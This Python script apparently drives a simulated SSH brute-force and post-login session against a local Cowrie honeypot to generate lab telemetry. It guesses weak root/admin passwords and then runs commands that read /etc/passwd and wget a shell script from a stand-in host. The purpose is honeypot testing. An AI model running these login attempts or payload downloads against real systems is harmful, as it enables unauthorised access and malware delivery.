"""Simulate an SSH brute-force + post-exploitation session against the local Cowrie honeypot.

LAB ONLY - targets 127.0.0.1:2222 (your own Cowrie container). Generates realistic attacker
telemetry (login attempts with credentials + executed commands) for Cowrie to capture.
"""
import paramiko

TARGET, PORT = "127.0.0.1", 2222
ATTEMPTS = [("root", "123456"), ("admin", "admin"), ("root", "letmein123")]
POST_CMDS = ["whoami", "uname -a", "cat /etc/passwd", "wget http://203.0.113.10/x.sh -O /tmp/x.sh"]


def try_login(user, pw):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cli.connect(TARGET, PORT, username=user, password=pw, timeout=10,
                    allow_agent=False, look_for_keys=False, banner_timeout=10)
        print(f"[+] LOGIN OK   {user}:{pw}")
        for cmd in POST_CMDS:
            _in, out, _err = cli.exec_command(cmd)
            sample = out.read()[:60].decode(errors="ignore").replace("\n", " ")
            print(f"      $ {cmd:<40} -> {sample!r}")
        cli.close()
    except paramiko.AuthenticationException:
        print(f"[-] LOGIN FAIL {user}:{pw}  (auth rejected)")
    except Exception as exc:  # noqa: BLE001
        print(f"[-] ERROR      {user}:{pw}  ({type(exc).__name__})")


if __name__ == "__main__":
    for u, p in ATTEMPTS:
        try_login(u, p)
